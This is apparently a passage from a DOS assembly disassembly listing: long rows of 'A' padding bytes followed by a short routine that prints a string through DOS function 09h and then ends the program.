		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAA'
loc_63:
		mov	ah,9
		mov	dx,offset data_14	; (936E:0103=90h)
		int	21h			; DOS Services  ah=function 09h
						;  display char string at ds:dx
		int	20h			; Program Terminate
  
seg_a		ends
  
  
  
		end	start
